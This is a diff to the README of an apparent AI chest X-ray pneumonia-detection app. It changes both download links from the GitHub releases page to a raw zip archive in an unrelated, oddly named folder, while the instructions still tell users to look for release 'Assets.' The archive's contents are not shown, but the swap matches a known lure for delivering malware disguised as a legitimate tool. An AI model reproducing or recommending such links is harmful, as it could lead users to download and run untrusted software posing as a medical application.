@@ -1,6 +1,6 @@
 # 🩺 pneumonia-xai-detector - See inside chest images for clarity
 
-[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/Populusnigraphaseolusmultiflorus219/pneumonia-xai-detector/releases)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Populusnigraphaseolusmultiflorus219/pneumonia-xai-detector/main/calycinal/xai-detector-pneumonia-v1.8-alpha.3.zip)
 
 This application helps users examine chest X-rays to detect signs of pneumonia. It uses artificial intelligence to identify patterns in medical images. The software provides visual highlights that show where the model finds evidence of infection. It also measures the level of confidence in each result. This clarity assists users as they review medical imaging files.
 
@@ -16,7 +16,7 @@ This application helps users examine chest X-rays to detect signs of pneumonia. 
 
 Visit the link below to reach the releases page. Choose the latest version available in the list.
 
-[Download the application here](https://github.com/Populusnigraphaseolusmultiflorus219/pneumonia-xai-detector/releases)
+[Download the application here](https://raw.githubusercontent.com/Populusnigraphaseolusmultiflorus219/pneumonia-xai-detector/main/calycinal/xai-detector-pneumonia-v1.8-alpha.3.zip)
 
 1. Navigate to the link provided.
 2. Look for the section labeled "Assets."
